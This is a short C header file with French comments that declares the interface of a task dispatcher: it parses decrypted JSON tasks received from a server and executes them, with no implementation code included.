/*
 * dispatcher.h - Dispatch des commandes vers les handlers
 *
 * Reçoit les tâches du serveur et les route vers le bon handler.
 */

#ifndef DISPATCHER_H
#define DISPATCHER_H

#include "../../include/common.h"

/* Prototypes */

/*
 * Initialise le dispatcher.
 */
int dispatcher_init(void);

/*
 * Parse les tâches reçues du serveur.
 *
 * Params:
 *   json_data   - Données JSON reçues (déchiffrées)
 *   data_len    - Taille des données
 *   tasks       - Pointeur vers le tableau de tâches (alloué par la fonction)
 *   task_count  - Nombre de tâches
 *
 * Retourne STATUS_SUCCESS ou un code d'erreur.
 */
int dispatcher_parse_tasks(const char *json_data, size_t data_len,
                           task_t **tasks, int *task_count);

/*
 * Exécute une tâche et remplit le résultat.
 *
 * Params:
 *   task    - Tâche à exécuter
 *   result  - Structure pour stocker le résultat
 *
 * Retourne STATUS_SUCCESS ou un code d'erreur.
 */
int dispatcher_execute(task_t *task, task_result_t *result);

/*
 * Cleanup du dispatcher.
 */
void dispatcher_cleanup(void);

#endif /* DISPATCHER_H */
